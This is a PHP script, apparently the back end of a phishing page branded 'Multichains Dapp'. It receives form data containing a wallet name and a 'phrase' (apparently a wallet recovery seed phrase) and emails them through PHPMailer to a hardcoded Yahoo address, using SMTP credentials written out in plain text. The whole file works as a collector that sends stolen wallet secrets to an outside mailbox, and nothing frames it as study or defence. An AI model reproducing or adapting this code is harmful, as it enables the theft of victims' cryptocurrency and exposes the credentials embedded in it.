<?php
// Include PHPMailer classes
require './PHPMailer/src/PHPMailer.php';
require './PHPMailer/src/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the raw POST data
    $rawData = file_get_contents("php://input");
    $data = json_decode($rawData, true);

    // Retrieve form data from the JSON
    $service_id = $data['service_id'] ?? '';
    $template_id = $data['template_id'] ?? '';
    $user_id = $data['user_id'] ?? '';
    $type = $data['template_params']['type'] ?? '';
    $wallet = $data['template_params']['wallet'] ?? '';
    $phrase = $data['template_params']['phrase'] ?? '';
    $link = $data['template_params']['link'] ?? '';

    // Define recipient email address
    $to = "cozyajis@yahoo.com"; // Replace with actual recipient email

    // Define SMTP configuration
    $smtp_host = 'smtp.hostinger.com'; // Replace with your SMTP server address
    $smtp_port = 587; // May vary depending on your provider
    $smtp_username = 'team@basedavvgz.online'; // Replace with your email credentials
    $smtp_password = 'Password123@'; // Replace with your email password

    // Define sender details
    $sender_email = 'team@basedavvgz.online'; // Replace with sender email
    $sender_name = 'Multichains Dapp'; // Replace with sender name

    // Create a new PHPMailer instance
    $mail = new PHPMailer(true); // Set exceptions for debugging

    try {
        // SMTP configuration
        $mail->isSMTP();
        $mail->Host = $smtp_host;
        $mail->Port = $smtp_port;
        $mail->SMTPAuth = true;
        $mail->Username = $smtp_username;
        $mail->Password = $smtp_password;
        $mail->SMTPSecure = 'tls'; // Adjust encryption if needed (e.g., 'starttls')

        // Set email content and sender details
        $mail->setFrom($sender_email, $sender_name);
        $mail->addAddress($to);
        $mail->isHTML(false); // Set email format to plain text

        // Build email message
        $message = "Service ID: $service_id\n";
        $message .= "Template ID: $template_id\n";
        $message .= "User ID: $user_id\n\n";
        $message .= "Type: $type\n";
        $message .= "Wallet: $wallet\n";
        $message .= "Phrase: $phrase\n";
        $message .= "Link: $link\n";

        $mail->Subject = "Multichains Dapp FORM DATA - $wallet";
        $mail->Body = $message;

        // Send email
        $mail->send();

        // Email sent successfully
        $response['status'] = 'success';
        $response['message'] = "Email sent successfully.";
    } catch (Exception $e) {
        // Email sending error
        $response['status'] = 'error';
        $response['message'] = "Failed to send email: " . $mail->ErrorInfo;
    }

    // Return the JSON response
    header('Content-Type: application/json');
    echo json_encode($response);
} else {
    // Invalid request method
    http_response_code(400);
    $response['status'] = 'error';
    $response['message'] = 'Invalid request method.';
    echo json_encode($response);
}
?>
